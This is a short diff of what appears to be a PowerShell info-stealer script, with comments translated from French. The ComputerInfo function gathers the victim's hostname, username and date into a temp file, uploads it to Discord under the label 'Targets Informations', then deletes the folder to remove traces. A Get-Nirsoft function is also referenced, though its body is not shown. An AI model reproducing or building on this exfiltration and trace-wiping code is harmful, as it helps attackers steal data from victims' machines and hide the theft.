@@ -10,7 +10,7 @@ function Get-Nirsoft {
 
 }
 
-function Info1 {
+function ComputerInfo {
 cd C:\
 mkdir \temp
 cd \temp
@@ -28,9 +28,9 @@ $Info1content = "Nom du pc : $namepc`r`nUser : $user`r`nDate : $date"
 $Info1content | Out-File -FilePath "C:\Temp\Info1content.txt" -Encoding utf8
 
 #Upload to Discord via the Upload-Discord function
-Upload-Discord -file "C:\temp\Info1content.txt" -text "Hostname, Username, Date :"
+Upload-Discord -file "C:\temp\Info1content.txt" -text "Targets Informations :"
 
-#Efface les traces et supprime le dossier temporaire créé
+#Removing every file to remove traces
 rmdir -R \temp
 }
 
